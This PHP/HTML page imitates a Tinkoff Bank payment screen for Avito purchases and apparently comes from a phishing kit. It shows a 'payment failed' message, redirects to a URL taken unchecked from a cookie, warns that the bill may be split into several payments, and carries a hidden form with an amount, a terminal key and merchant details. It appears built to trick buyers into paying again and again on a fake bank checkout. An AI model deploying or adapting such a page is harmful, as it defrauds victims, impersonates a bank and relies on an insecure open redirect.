<?

header( "Refresh:5;". $_COOKIE['cok']);
?>
<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <script type="text/javascript" src="html/payForm/default/tcs_translate.js?ver=1522308077655"></script>
    <link rel="stylesheet" href="html/payForm/default/avito_common.css?ver=1522308077655">
    <script type="text/javascript" src="html/payForm/default/lib/jquery-1.11.2.min.js?ver=1522308077655"></script>
    <script type="text/javascript" src="html/payForm/default/index.js?ver=1522308077655"></script>
    <script type="text/javascript" src="html/payForm/default/respond.min.js?ver=1522308077655"></script>
    <link href="html/payForm/images/favicon.ico" rel="icon" type="image/x-icon">
    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
    <title>Тинькофф Банк - Оплата</title>
</head>

<body id="body">
    <div class="wrapper">
        <div class="wrapper__middle">
            <div class="header">
                <div class="header__logo"><img src="html/payForm/logo/logo-avito.svg" alt="Avito"></div>
                <div class="header__fin-service">
                    <div class="header__fin-service-image images__visa"></div>
                    <div class="header__fin-service-image header__fin-service-image_diff images__master-card"></div>
                    <div class="header__fin-service-image header__fin-service-image_last header__fin-service-mobile images__maestro"></div>
                    <div class="header__fin-service-image header__fin-service-image_last images__mir"></div>
                </div>
            </div>
            <div class="mobile-border mobile-border_top">
                <div class="mobile-border__line"></div>
            </div>
            <div class="title">Оплата неуспешна! Вы вернетесь на страницу оплаты через несколько секунд.</div>
            
                <div class="alert alert-dismissible alert-warning" >
            <p class="mb-0">Для обеспечения безопасности, Ваш счёт к оплате может быть разбит на <b>несколько</b>
                платежей.</p>
        </div>
    </div>
    </div>
    <div class="footer">
        <div class="form-card-supported-systems"><i class="grey-icon grey-icon-master-card"></i> <i class="grey-icon grey-icon-visa"></i> <i class="grey-icon grey-icon-mir"></i> <i class="grey-icon grey-icon-pci-dss"></i></div>
        <div class="form-card-add-info">Интернет-платежи защищены сертификатом SSL и протоколом 3D Secure. АО «Тинькофф Банк» не передает магазинам платежные данные, в том числе данные карты. Оплачивая заказ вы соглашаетесь с <a href="https://static2.tinkoff.ru/acquiring/agreement_avito2.pdf"
                target="_blank" rel="noopener noreferrer">офертой</a></div>
        <div class="form-card-add-info__logo">Сервис предоставлен «Тинькофф Банк»</div>
    </div>
    <form name="substitutionFM" style="display:none" onsubmit="return!1"><button name="Routes" type="button">{"routes":{}}</button> <input name="Route" type="hidden" value="ACQ"> <input name="Amount" type="hidden" value="365300"> <input name="Language" type="hidden" value="ru"> <input name="ErrorMessage" type="hidden"
            value=""> <input name="Email" type="hidden" value=""> <input name="IsBill" type="hidden" value="N"> <input name="TerminalKey" type="hidden" value="Avito_pokupka"> <input name="PaymentId" type="hidden" value="107538246"> <input name="PhonesReq"
            type="hidden" value="+7(495) 228-3630"> <input name="CompanyAddress" type="hidden" value="Россия, Москва, ул Лесная, д/стр. 7"></form>
    <script>
        function getSubstitutionFM(e) {
            var t, n = {},
                m = document.forms.namedItem(e);
            if (m)
                for (var r = 0, i = m.elements.length; r < i; r++) 'button' != (t = m.elements.item(r)).type ? n[t.name] = t.value : n[t.name] = String(t.innerHTML);
            return n
        }
    </script>
    <script>
        $(document).ready(function() {
            var e = getSubstitutionFM('substitutionFM');
            window.trnTcs = new TcsTranslate, window.trnTcs.defLng = e.Language, window.trnTcs.init(window.trnTcs.defLng, '/html/payForm/default/'), window.trnTcs.apply(), e.ErrorMessage && (document.getElementById("error-span").innerHTML = "Ошибка при оплате: " + e.ErrorMessage, document.getElementById("error-span").style = "color: #ff4d4d;"), $('#telSpan').text(e.PhonesReq.replace(/^(.*)(\d{3})(\d{3})(\d{2})(\d{2})$/, '+7 ($2) $3-$4-$5', 'i')), e.Email && "N" == e.IsBill && ($('.form-sendmail__checkbox').prop('checked', !0), $('.form-sendmail').addClass('form-sendmail_checked'), $('.form-submit').addClass('form-submit__with-mail')), "Y" == e.IsBill && ($('.form-sendmail__checkbox').prop('checked', !0), $('.form-sendmail__checkbox').prop('disabled', !0), $('.form-sendmail').addClass('form-sendmail_checked'), $('.form-submit').addClass('form-submit__with-mail'), $('#payDescr').prop('hidden', !0), $('#ordDescr').prop('hidden', !1), $('#orgMerchant').prop('hidden', !0), $('#orgOrg').prop('hidden', !1), e.CompanyAddress && $('#orgAddress').prop('hidden', !1), $('#telReq').prop('hidden', !1), $('#emailReq').prop('hidden', !1)), readySteady(e.TerminalKey, e.PaymentId)
        })
    </script>
</body>

</html>